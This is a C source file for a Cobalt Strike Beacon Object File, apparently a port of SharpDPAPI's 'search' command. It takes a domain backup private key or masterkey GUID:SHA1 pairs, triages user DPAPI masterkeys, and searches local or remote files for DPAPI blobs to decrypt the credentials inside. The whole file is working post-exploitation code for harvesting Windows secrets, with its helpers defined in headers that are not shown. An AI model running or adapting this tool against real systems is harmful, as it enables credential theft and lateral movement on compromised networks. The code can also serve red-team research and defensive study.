/*
 * search.c — BOF for searching files containing DPAPI blobs
 *
 * Usage:
 *   search [/target:PATH] [/server:SERVER] [/pattern:REGEX]
 *          [/pvk:BASE64] [/credkey:KEY]
 *
 * Searches for files containing DPAPI blobs and attempts decryption.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str  = BeaconDataExtract(&parser, NULL);
    char* server_str  = BeaconDataExtract(&parser, NULL);
    char* pattern     = BeaconDataExtract(&parser, NULL);
    char* pvk_b64     = BeaconDataExtract(&parser, NULL);
    char* credkey     = BeaconDataExtract(&parser, NULL);

    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0)
        pvk = base64_decode(pvk_b64, &pvk_len);

    wchar_t* target = NULL;
    wchar_t* server = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
    if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Pre-load keys */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    /* Triage masterkeys if PVK provided */
    if (pvk) {
        triage_user_masterkeys(&cache, pvk, pvk_len,
            NULL, NULL, NULL, FALSE, NULL, server, FALSE, NULL);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Search (BOF) ===\n");

    triage_search(&cache, target, server,
        (pattern && strlen(pattern) > 0) ? pattern : NULL);

    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    if (target) intFree(target);
    if (server) intFree(server);
}
